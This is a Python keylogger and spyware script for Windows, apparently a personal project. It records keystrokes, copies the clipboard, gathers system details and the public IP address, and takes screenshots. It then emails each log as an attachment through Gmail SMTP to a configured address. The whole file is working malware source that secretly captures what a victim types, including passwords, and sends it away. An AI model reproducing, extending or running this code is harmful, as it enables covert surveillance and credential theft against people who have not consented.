# Still working on adding encryption, getpass, and a way to iterate screenshots
# All unused modules are for that

from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Declaring important variables for data storage
keys_info = "keysInfo.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"

# time_iteration = 15
# num_iterations_end = 3

# Email account the information will be sent to
emailAddress = ""
password = ""
toAddress = ""

# File path the data variables will be stored into
file_path = ""
extend = "\\"

# Creating an array to hold keys, and starting a counter to reset key presses.
count = 0
keys = []


# Main Keylogging Module
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Writes the files to the log and cleans up the output
def write_file(key):
    with open(file_path + extend + keys_info, "a") as f:
        for key in key:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# Ads a kill switch as pressing "esc"
def on_release(key):
    if key == Key.esc:
        return False


# Starts the listener
with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()


# Using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
def send_email(filename, attachment, toAddress):
    fromAddress = emailAddress
    msg = MIMEMultipart()
    msg['From'] = fromAddress
    msg['To'] = toAddress
    msg['Subject'] = "Keylog File"
    body = "New log files"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddress, password)
    text = msg.as_string()
    s.sendmail(fromAddress, toAddress, text)
    s.quit()


send_email(keys_info, file_path + extend + keys_info, toAddress)


# Extracts a lot of information about the computer and saves it to the file path
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        ipAddress = socket.gethostbyname(hostname)

        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP + '\n')

        except Exception:
            f.write("Couldn't locate Public IP Address, likely reached max query" + '\n')

        f.write("Processor: " + (platform.processor() + '\n'))
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipAddress + '\n')


# Copy the clipboard and save it to the file path
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pastedData + '\n')

        except:
            f.write("Could not copy clipboard")


# Taking a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)


# Calling all of the spyware modules and emailing the results.

copy_clipboard()
send_email(clipboard_info, file_path + extend + clipboard_info, toAddress)

computer_info()
send_email(system_info, file_path + extend + system_info, toAddress)

screenshot()
send_email(screenshot_info, file_path + extend + screenshot_info, toAddress)
